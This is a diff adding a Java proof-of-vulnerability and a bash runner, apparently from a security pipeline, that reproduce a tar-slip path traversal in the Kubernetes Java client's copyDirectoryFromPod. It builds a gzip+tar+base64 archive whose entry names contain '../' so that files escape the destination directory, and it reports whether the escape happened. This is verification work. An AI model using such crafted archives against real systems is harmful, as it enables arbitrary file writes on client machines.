+import io.kubernetes.client.Copy;
+import io.kubernetes.client.openapi.ApiClient;
+import io.kubernetes.client.openapi.ApiException;
+
+import java.io.ByteArrayInputStream;
+import java.io.ByteArrayOutputStream;
+import java.io.File;
+import java.io.FileInputStream;
+import java.io.IOException;
+import java.io.InputStream;
+import java.io.OutputStream;
+import java.nio.charset.StandardCharsets;
+import java.util.Base64;
+import org.apache.commons.compress.archivers.tar.TarArchiveEntry;
+import org.apache.commons.compress.archivers.tar.TarArchiveOutputStream;
+import org.apache.commons.compress.compressors.gzip.GzipCompressorOutputStream;

+/**
+ * Proof-of-vulnerability for CWE-22 (path traversal / "tar slip") in
+ * io.kubernetes.client.Copy#copyDirectoryFromPod(...).
+ *
+ * Root cause (sink): Copy.java:140
+ *     File f = new File(destination.toFile(), entry.getName());
+ * `entry.getName()` comes straight from a TarArchiveEntry inside the tar
+ * stream produced by `tar cz - <srcPath> | base64` run *inside the target
+ * pod/container* (an untrusted boundary: whatever the remote container
+ * returns is treated as trusted local filesystem paths). No canonicalization
+ * or containment check is performed before `f` (or its parent) is used to
+ * create directories / write file content, so a malicious or compromised
+ * pod can supply entry names like "../evil.txt" to escape the caller's
+ * `destination` directory and write/create arbitrary files/directories
+ * on the machine running the java client.
+ *
+ * This single root cause fans out to two sinks that must both be fixed:
+ *   - Copy.java:140/142 - directory entries: `f.mkdirs()` is called directly
+ *     on the unsanitized path (creates attacker-chosen directories).
+ *   - Copy.java:140/146/147 - file entries: `f.getParentFile()` /
+ *     `parent.mkdirs()` creates attacker-chosen parent directories, followed
+ *     by `new FileOutputStream(f)` at line 150 writing attacker-controlled
+ *     content to an attacker-chosen path outside `destination`.
+ *
+ * This PoV exercises the real Copy.copyDirectoryFromPod(...) method (the
+ * actual tar-parsing / extraction loop at lines 131-155) end to end. Only
+ * the pod exec transport is faked (by subclassing Copy and overriding the
+ * inherited `exec(...)` method, exactly the seam the class already exposes
+ * for testing), because copyDirectoryFromPod's vulnerable logic operates on
+ * whatever bytes come back from `proc.getInputStream()` - it does not care
+ * whether those bytes came from a real websocket or a canned stream. The
+ * crafted payload below is a genuine gzip+tar+base64 stream containing a
+ * TarArchiveEntry named "../pov-tarslip-escaped-file.txt" and another named
+ * "../pov-tarslip-escaped-dir/", parsed by the real TarArchiveInputStream /
+ * GzipCompressorInputStream / Base64InputStream exactly as production code
+ * does.
+ *
+ * Exit code contract:
+ *   0 -> vulnerable behavior reproduced (file/dir escaped destination)
+ *   1 -> escape did not happen (fixed) or the call errored out safely
+ */
+public class CopyTarSlipPov {
+
+  private static final String ESCAPE_FILE_NAME = "../pov-tarslip-escaped-file.txt";
+  private static final String ESCAPE_DIR_NAME = "../pov-tarslip-escaped-dir";
+  private static final String MARKER = "TARSLIP-POV-MARKER";
+
+  public static void main(String[] args) {
+    try {
+      File sandboxRoot = createTempDir("copy-tarslip-pov");
+      File destination = new File(sandboxRoot, "safe-extract-target");
+      if (!destination.mkdirs()) {
+        throw new IOException("could not create destination: " + destination);
+      }
+
+      byte[] maliciousPayload = buildMaliciousTarGzBase64(ESCAPE_FILE_NAME, ESCAPE_DIR_NAME, MARKER);
+
+      ApiClient fakeClient = new ApiClient();
+      FakeCopy copy = new FakeCopy(fakeClient, maliciousPayload);
+
+      File expectedEscapedFile =
+          new File(destination, ESCAPE_FILE_NAME).getCanonicalFile();
+      File expectedEscapedDir =
+          new File(destination, ESCAPE_DIR_NAME).getCanonicalFile();
+      String destinationCanonical = destination.getCanonicalPath();
+
+      // The call that exercises the real, unmodified Copy.copyDirectoryFromPod
+      // extraction loop (Copy.java:119-158) against the malicious tar stream.
+      // Only this.exec(...) is faked (see FakeCopy below); everything else -
+      // base64 decode, gzip decode, tar parsing, `new File(destination, name)`,
+      // mkdirs(), and FileOutputStream writes - is the real production code.
+      boolean threwDuringExtract = false;
+      try {
+        copy.copyDirectoryFromPod("default", "victim-pod", "victim-container", "/some/src", destination.toPath());
+      } catch (Exception e) {
+        threwDuringExtract = true;
+        System.out.println("copyDirectoryFromPod(...) rejected/failed on malicious tar: " + e);
+      }
+
+      boolean escapedFileExists = expectedEscapedFile.isFile();
+      boolean escapedFileOutside =
+          escapedFileExists
+              && !expectedEscapedFile.getCanonicalPath().startsWith(destinationCanonical + File.separator);
+      boolean markerMatches = escapedFileExists && readFile(expectedEscapedFile).contains(MARKER);
+
+      boolean escapedDirExists = expectedEscapedDir.isDirectory();
+      boolean escapedDirOutside =
+          escapedDirExists
+              && !expectedEscapedDir.getCanonicalPath().startsWith(destinationCanonical + File.separator);
+
+      boolean vulnerable =
+          (escapedFileExists && escapedFileOutside && markerMatches) || (escapedDirExists && escapedDirOutside);
+
+      System.out.println("destination                 = " + destinationCanonical);
+      System.out.println("malicious file entry name    = " + ESCAPE_FILE_NAME);
+      System.out.println("malicious dir entry name     = " + ESCAPE_DIR_NAME);
+      System.out.println("resolved escape file path    = " + expectedEscapedFile);
+      System.out.println("resolved escape dir path     = " + expectedEscapedDir);
+      System.out.println("copyDirectoryFromPod threw   = " + threwDuringExtract);
+      System.out.println("escaped file exists          = " + escapedFileExists);
+      System.out.println("escaped file outside dest    = " + escapedFileOutside);
+      System.out.println("escaped file marker matches  = " + markerMatches);
+      System.out.println("escaped dir exists           = " + escapedDirExists);
+      System.out.println("escaped dir outside dest     = " + escapedDirOutside);
+
+      // best-effort cleanup
+      deleteRecursiveQuietly(expectedEscapedFile.getParentFile());
+      deleteRecursiveQuietly(sandboxRoot);
+      deleteRecursiveQuietly(expectedEscapedFile);
+      deleteRecursiveQuietly(expectedEscapedDir);
+
+      if (vulnerable) {
+        System.out.println(
+            "RESULT: VULNERABLE - Copy.copyDirectoryFromPod() wrote a file/dir outside the requested destination directory (tar slip / CWE-22).");
+        System.exit(0);
+      } else {
+        System.out.println(
+            "RESULT: SAFE - Copy.copyDirectoryFromPod() did not write outside the requested destination directory.");
+        System.exit(1);
+      }
+    } catch (Exception e) {
+      e.printStackTrace();
+      System.out.println("RESULT: ERROR - unexpected failure while running the PoV.");
+      System.exit(2);
+    }
+  }
+
+  /**
+   * Subclass of the real Copy class that fakes only the pod-exec transport
+   * (this.exec(...)), which is the seam Copy already relies on for its own
+   * unit tests (see CopyTest.java, which stubs the HTTP/websocket layer).
+   * Everything downstream of exec(...) - the base64 decode, gzip decode,
+   * tar parsing, and file/directory creation - is the real, unmodified
+   * production code path from Copy.java.
+   */
+  private static class FakeCopy extends Copy {
+    private final byte[] maliciousBase64GzipTarPayload;
+
+    FakeCopy(ApiClient apiClient, byte[] maliciousBase64GzipTarPayload) {
+      super(apiClient);
+      this.maliciousBase64GzipTarPayload = maliciousBase64GzipTarPayload;
+    }
+
+    @Override
+    public Process exec(
+        String namespace, String name, String[] command, String container, boolean stdin, boolean tty)
+        throws ApiException, IOException {
+      String joined = String.join(" ", command);
+      if (joined.contains("tar --version")) {
+        // Pretend the container has tar installed.
+        return new StubProcess(new ByteArrayInputStream(new byte[0]), 0);
+      }
+      if (joined.contains("tar cz")) {
+        // Return the attacker-controlled tar stream that the "pod" would
+        // have produced, base64-encoded exactly like the real `| base64`
+        // pipeline in copyDirectoryFromPod's exec command.
+        return new StubProcess(new ByteArrayInputStream(maliciousBase64GzipTarPayload), 0);
+      }
+      throw new IOException("unexpected command in PoV stub: " + joined);
+    }
+  }
+
+  /** Minimal java.lang.Process stand-in used only to feed canned bytes to Copy's extraction loop. */
+  private static class StubProcess extends Process {
+    private final InputStream inputStream;
+    private final int exitCode;
+
+    StubProcess(InputStream inputStream, int exitCode) {
+      this.inputStream = inputStream;
+      this.exitCode = exitCode;
+    }
+
+    @Override
+    public OutputStream getOutputStream() {
+      return new ByteArrayOutputStream();
+    }
+
+    @Override
+    public InputStream getInputStream() {
+      return inputStream;
+    }
+
+    @Override
+    public InputStream getErrorStream() {
+      return new ByteArrayInputStream(new byte[0]);
+    }
+
+    @Override
+    public int waitFor() {
+      return exitCode;
+    }
+
+    @Override
+    public int exitValue() {
+      return exitCode;
+    }
+
+    @Override
+    public void destroy() {}
+  }
+
+  /**
+   * Builds a real gzip(tar(entries))-then-base64 byte stream containing a
+   * malicious file entry (with content, so we can verify it was actually
+   * written) and a malicious directory entry - matching exactly what
+   * `tar cz - <path> | base64` running inside a pod would produce, except
+   * the entry names contain ".." path traversal segments.
+   */
+  private static byte[] buildMaliciousTarGzBase64(String fileEntryName, String dirEntryName, String content)
+      throws IOException {
+    ByteArrayOutputStream rawOut = new ByteArrayOutputStream();
+    try (GzipCompressorOutputStream gzOut = new GzipCompressorOutputStream(rawOut);
+        TarArchiveOutputStream tarOut = new TarArchiveOutputStream(gzOut)) {
+      tarOut.setLongFileMode(TarArchiveOutputStream.LONGFILE_GNU);
+
+      byte[] fileBytes = content.getBytes(StandardCharsets.UTF_8);
+      TarArchiveEntry fileEntry = new TarArchiveEntry(fileEntryName);
+      fileEntry.setSize(fileBytes.length);
+      tarOut.putArchiveEntry(fileEntry);
+      tarOut.write(fileBytes);
+      tarOut.closeArchiveEntry();
+
+      TarArchiveEntry dirEntry = new TarArchiveEntry(dirEntryName + "/");
+      tarOut.putArchiveEntry(dirEntry);
+      tarOut.closeArchiveEntry();
+    }
+    return Base64.getEncoder().encode(rawOut.toByteArray());
+  }
+
+  private static String readFile(File f) throws IOException {
+    try (InputStream in = new FileInputStream(f)) {
+      ByteArrayOutputStream out = new ByteArrayOutputStream();
+      byte[] buf = new byte[4096];
+      int n;
+      while ((n = in.read(buf)) != -1) {
+        out.write(buf, 0, n);
+      }
+      return new String(out.toByteArray(), StandardCharsets.UTF_8);
+    }
+  }
+
+  private static File createTempDir(String prefix) throws IOException {
+    File base = File.createTempFile(prefix, "");
+    if (!base.delete()) {
+      throw new IOException("could not delete temp file placeholder: " + base);
+    }
+    if (!base.mkdirs()) {
+      throw new IOException("could not create temp dir: " + base);
+    }
+    return base;
+  }
+
+  private static void deleteRecursiveQuietly(File f) {
+    if (f == null || !f.exists()) {
+      return;
+    }
+    File[] children = f.listFiles();
+    if (children != null) {
+      for (File c : children) {
+        deleteRecursiveQuietly(c);
+      }
+    }
+    f.delete();
+  }
+}

+#!/usr/bin/env bash
+# POV runner for CWE-022 tar-slip path traversal in
+# io.kubernetes.client.Copy#copyDirectoryFromPod (Copy.java:140).
+#
+# Builds the `util` module (and its `client-java-api` / `client-java-proto`
+# dependencies) with Maven, resolves the module's runtime classpath,
+# compiles the standalone PoV against it, and runs it. Exits 0 iff a
+# malicious tar entry name ("../pov-tarslip-escaped-file.txt") is extracted
+# outside the caller-supplied destination directory by
+# Copy.copyDirectoryFromPod(...).
+#
+# Must be run from the repository root (/workspace/repo in the container).
+set -euo pipefail
+
+REPO_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
+cd "$REPO_ROOT"
+
+POV_DIR="$REPO_ROOT/.security-pipeline/pov"
+OUT_DIR="$POV_DIR/out"
+rm -rf "$OUT_DIR"
+mkdir -p "$OUT_DIR"
+
+# 1. Install `util` and its module dependencies (client-java-api,
+#    client-java-proto) into the local repo so the classpath resolves.
+mvn -q -B -pl util -am -DskipTests install
+
+# 2. Resolve util's runtime classpath.
+CP_FILE="$POV_DIR/cp.txt"
+mvn -q -B -pl util dependency:build-classpath -Dmdep.outputFile="$CP_FILE" >/dev/null

+CP="$REPO_ROOT/util/target/classes:$(cat "$CP_FILE")"
+
+# 3. Compile the PoV.
+javac -cp "$CP" -d "$OUT_DIR" "$POV_DIR/CopyTarSlipPov.java"
+
+# 4. Run the PoV. Exit code 0 == vulnerable behavior reproduced.
+java -cp "$CP:$OUT_DIR" CopyTarSlipPov
